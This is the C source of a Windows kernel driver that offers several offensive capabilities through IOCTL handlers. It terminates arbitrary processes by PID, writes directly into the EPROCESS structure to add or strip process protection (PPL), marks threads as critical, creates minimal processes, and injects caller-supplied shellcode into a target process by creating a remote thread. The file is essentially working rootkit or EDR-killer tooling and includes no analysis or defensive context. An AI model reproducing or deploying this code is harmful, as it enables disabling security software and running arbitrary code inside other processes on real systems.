#include "Main.h"


NTSTATUS ZwCreateProcessEx(
	__out PHANDLE ProcessHandle,
	__in ACCESS_MASK DesiredAccess,
	__in_opt POBJECT_ATTRIBUTES ObjectAttributes,
	__in HANDLE ParentProcess,
	__in ULONG Flags,
	__in_opt HANDLE SectionHandle,
	__in_opt HANDLE DebugPort,
	__in_opt HANDLE ExceptionPort,
	__in ULONG JobMemberLevel
);


NTSTATUS OpenProcessbyPid(ULONG pid, PHANDLE pHandle)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pEprocess = NULL;

	status = PsLookupProcessByProcessId((HANDLE)pid, &pEprocess);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("PsLookupProcessByProcessId", status);

		return status;
	}

	status = ObOpenObjectByPointer(pEprocess, OBJ_KERNEL_HANDLE, NULL,
		SYNCHRONIZE, NULL, KernelMode, pHandle);

	if(!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("ObOpenObjectByPointer", status);
	}

	ObDereferenceObject(pEprocess);

	return status;
}

NTSTATUS OpenThreadByTid(ULONG tid, PHANDLE pHandle)
{
	NTSTATUS status = STATUS_SUCCESS;
	PETHREAD pEthread = NULL;

	status = PsLookupThreadByThreadId((HANDLE)tid, &pEthread);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("PsLookupThreadByThreadId", status);

		return status;
	}

	status = ObOpenObjectByPointer(
		pEthread,
		OBJ_KERNEL_HANDLE,
		NULL,
		SYNCHRONIZE,
		NULL,
		KernelMode,
		pHandle);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("ObOpenObjectByPointer", status);
	}

	ObDereferenceObject(pEthread);

	return status;
}

NTSTATUS ProtectProcessLight(ULONG pid, ULONG_PTR protectionOffset, int level)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pEprocess = NULL;
	PVOID protectionMemberAddress = NULL;
	PS_PROTECTION processProtection = { 0 };

	status = PsLookupProcessByProcessId((HANDLE)pid, &pEprocess);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("PsLookupProcessByProcessId", status);

		return status;
	}

	protectionMemberAddress = (PVOID)((ULONG_PTR)pEprocess + protectionOffset);

	ObDereferenceObject(pEprocess);

	switch (level)
	{
	case 0:
		processProtection.Level = 0x0;
		processProtection.Flags.Audit = 0x0;
		processProtection.Flags.Signer = PsProtectedSignerNone;
		processProtection.Flags.Type = PsProtectedTypeNone;
		break;
	case 1:
		processProtection.Level = 0x61;
		processProtection.Flags.Audit = 0x0;
		processProtection.Flags.Signer = PsProtectedSignerWinTcb;
		processProtection.Flags.Type = PsProtectedTypeProtectedLight;
		break;
	case 2:
		processProtection.Level = 0x72;
		processProtection.Flags.Audit = 0x0;
		processProtection.Flags.Signer = PsProtectedSignerMax;
		processProtection.Flags.Type = PsProtectedTypeProtected;
		break;
	case 3:
		processProtection.Level = 0x72;
		processProtection.Flags.Audit = 0x0;
		processProtection.Flags.Signer = PsProtectedSignerMax;
		processProtection.Flags.Type = PsProtectedTypeMax;
		break;
	default:
		processProtection.Level = 0x0;
		processProtection.Flags.Audit = 0x0;
		processProtection.Flags.Signer = PsProtectedSignerNone;
		processProtection.Flags.Type = PsProtectedTypeNone;
		break;

	}

	// dangerous AS FUCK but it works
	RtlCopyMemory(protectionMemberAddress, &processProtection, sizeof(PS_PROTECTION));
	return status;
}



NTSTATUS CreateMinimalProcess(PWSTR processName)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE targetProcessHandle = NULL;

	OBJECT_ATTRIBUTES miniProcessObjectAttributes = { 0 };
	OBJECT_ATTRIBUTES ownProcessObjectAttributes = { 0 };
	UNICODE_STRING unicodeProcessName = { 0 };

	CLIENT_ID clientId = { 0 };
	HANDLE ownProcessHandle = NULL;

	RtlInitUnicodeString(&unicodeProcessName, processName);

	miniProcessObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	miniProcessObjectAttributes.Attributes = OBJ_KERNEL_HANDLE;
	miniProcessObjectAttributes.ObjectName = &unicodeProcessName;
	miniProcessObjectAttributes.RootDirectory = NULL;
	miniProcessObjectAttributes.SecurityDescriptor = NULL;
	miniProcessObjectAttributes.SecurityQualityOfService = NULL;

	clientId.UniqueThread = PsGetCurrentThreadId();
	clientId.UniqueProcess = PsGetCurrentProcessId();

	InitializeObjectAttributes(
		&ownProcessObjectAttributes,
		NULL,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	status = ZwOpenProcess(
		&ownProcessHandle,
		PROCESS_ALL_ACCESS,
		&ownProcessObjectAttributes,
		&clientId);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("ZwOpenProcess", status);
		return status;
	}

	status = ZwCreateProcessEx(
		&targetProcessHandle,
		GENERIC_ALL,
		&miniProcessObjectAttributes,
		ownProcessHandle,
		PROCESS_CREATE_FLAGS_MINIMAL,
		NULL,
		NULL,
		NULL,
		FALSE);


	ZwClose(ownProcessHandle);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("ZwCreateProcessEx", status);

		return status;
	}

	// ZwClose(targetProcessHandle); This kills the process as the ref count will drop to 0

	return status;
}


NTSTATUS TerminateProcessIoctlHandler(PIRP pIrp)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE processHandle = NULL;

	ULONG pid = *((ULONG*)pIrp->AssociatedIrp.SystemBuffer);

	status = OpenProcessbyPid(pid, &processHandle);

	if (NT_SUCCESS(status))
	{
		status = ZwTerminateProcess(processHandle, STATUS_SUCCESS);
		ObCloseHandle(processHandle, KernelMode);
	}

	return status;
}


NTSTATUS ProtectProcessIoctlHandler(PIRP pIrp)
{
	PPROTECT_PROCESS_PARAMETER pProtectionParameter = (PPROTECT_PROCESS_PARAMETER)pIrp->AssociatedIrp.SystemBuffer;

	return ProtectProcessLight(pProtectionParameter->Pid, pProtectionParameter->ProtectionOffset, pProtectionParameter->Level);
}

NTSTATUS CriticalThreadIoctlHandler(PIRP pIrp)
{
	HANDLE threadHandle;
	NTSTATUS status = STATUS_SUCCESS;

	PCRITICAL_THREAD_PARAMETER criticalThreadParameter = (PCRITICAL_THREAD_PARAMETER)pIrp->AssociatedIrp.SystemBuffer;

	status = OpenThreadByTid(criticalThreadParameter->Tid, &threadHandle);

	if (NT_SUCCESS(status))
	{
		status = ZwSetInformationThread(threadHandle, ThreadBreakOnTermination, &criticalThreadParameter->Critical, sizeof(criticalThreadParameter->Critical));
		ZwClose(threadHandle);
	}

	return status;
}

NTSTATUS MinimalProcessIoctlHandler(PIRP pIrp)
{
	LPWSTR processName = (LPWSTR)pIrp->AssociatedIrp.SystemBuffer;

	return CreateMinimalProcess(processName);
}

NTSTATUS InjectShellcodeIoctlHandler(PIRP pIrp)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE targetProcessHandle = NULL;
	PVOID remoteShellcodeBufferBase = NULL;
	PVOID remoteShellcodeParameterBase = NULL;
	SIZE_T shellcodeBytesWritten = 0;
	SIZE_T shellcodeParameterBytesWritten = 0;
	ULONG shellcodeProtection = PAGE_READWRITE;
	HANDLE remoteThreadHandle = NULL;
	PEPROCESS pTargetEprocess = NULL;
	CLIENT_ID remoteThreadClientId = { 0 };


	PINJECT_SHELLCODE_PARAMETER pIoctlInfo = (PINJECT_SHELLCODE_PARAMETER)pIrp->AssociatedIrp.SystemBuffer;

	SIZE_T remoteShellcodeBufferRegionSize = pIoctlInfo->ShellcodeBufferSizeBytes;
	SIZE_T remoteShellcodeParameterBufferRegionSize = pIoctlInfo->ShellcodeParameterBufferSizeBytes;
	

	if (pIoctlInfo->ShellcodeBufferSizeBytes == 0 || pIoctlInfo->Pid == 0 || pIoctlInfo->ShellcodeBuffer == NULL)
	{
		return STATUS_INVALID_PARAMETER;
	}

	status = OpenProcessbyPid(pIoctlInfo->Pid, &targetProcessHandle);

	if (!NT_SUCCESS(status))
	{
		targetProcessHandle = NULL;

		goto _InjectShellcodeIoctlHandler_Cleanup;
	}

	status = ZwAllocateVirtualMemory(
		targetProcessHandle,
		&remoteShellcodeBufferBase,
		0,
		&remoteShellcodeBufferRegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("ZwAllocateVirtualMemory", status);

		remoteShellcodeBufferBase = NULL;

		goto _InjectShellcodeIoctlHandler_Cleanup;
	}

	
	status = PsLookupProcessByProcessId(ULongToHandle(pIoctlInfo->Pid), &pTargetEprocess);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("PsLookupProcessByProcessId", status);

		pTargetEprocess = NULL;

		goto _InjectShellcodeIoctlHandler_Cleanup;
	}

	status = MmCopyVirtualMemory(
		PsGetCurrentProcess(),
		pIoctlInfo->ShellcodeBuffer,
		pTargetEprocess,
		remoteShellcodeBufferBase,
		pIoctlInfo->ShellcodeBufferSizeBytes,
		KernelMode,
		&shellcodeBytesWritten);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("MmCopyVirtualMemory", status);

		goto _InjectShellcodeIoctlHandler_Cleanup;
	}


	status = ZwProtectVirtualMemory(
		targetProcessHandle,
		&remoteShellcodeBufferBase,
		&(pIoctlInfo->ShellcodeBufferSizeBytes),
		PAGE_EXECUTE_READ,
		&shellcodeProtection);


	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("ZwProtectVirtualMemory", status);

		goto _InjectShellcodeIoctlHandler_Cleanup;
	}

	if (pIoctlInfo->ShellcodeParameterBuffer != NULL && remoteShellcodeParameterBufferRegionSize != 0)
	{
		status = ZwAllocateVirtualMemory(
			targetProcessHandle,
			&remoteShellcodeParameterBase,
			0,
			&remoteShellcodeParameterBufferRegionSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE);

		if (!NT_SUCCESS(status))
		{
			DBGERRNTSTATUS("ZwAllocateVirtualMemory", status);

			remoteShellcodeParameterBase = NULL;

			goto _InjectShellcodeIoctlHandler_Cleanup;
		}


		status = MmCopyVirtualMemory(
			PsGetCurrentProcess(),
			pIoctlInfo->ShellcodeParameterBuffer,
			pTargetEprocess,
			remoteShellcodeParameterBase,
			remoteShellcodeParameterBufferRegionSize,
			KernelMode,
			&shellcodeParameterBytesWritten);

		if (!NT_SUCCESS(status))
		{
			DBGERRNTSTATUS("MmCopyVirtualMemory", status);

			goto _InjectShellcodeIoctlHandler_Cleanup;
		}
	}

	status = RtlCreateUserThread(
		targetProcessHandle,
		NULL,
		FALSE,
		0,
		0,
		0,
		remoteShellcodeBufferBase,
		remoteShellcodeParameterBase, // Thread Parameter
		&remoteThreadHandle,
		&remoteThreadClientId);

	if (!NT_SUCCESS(status))
	{
		DBGERRNTSTATUS("RtlCreateUserThread", status);

		remoteThreadHandle = NULL;

		goto _InjectShellcodeIoctlHandler_Cleanup;
	}

	ZwWaitForSingleObject(remoteThreadHandle, FALSE, NULL);


_InjectShellcodeIoctlHandler_Cleanup:

	if (remoteThreadHandle)
	{
		ZwClose(remoteThreadHandle);
	}

	if (remoteShellcodeParameterBase)
	{
		ZwFreeVirtualMemory(targetProcessHandle, &remoteShellcodeParameterBase, &remoteShellcodeParameterBufferRegionSize, MEM_DECOMMIT | MEM_RELEASE);
	}

	if (remoteShellcodeBufferBase)
	{
		ZwFreeVirtualMemory(targetProcessHandle, &remoteShellcodeBufferBase, &remoteShellcodeBufferRegionSize, MEM_DECOMMIT | MEM_RELEASE);
	}

	if (pTargetEprocess != NULL)
	{
		ObDereferenceObject(pTargetEprocess);
	}

	if (targetProcessHandle != NULL)
	{
		ZwClose(targetProcessHandle);
	}

	return status;
}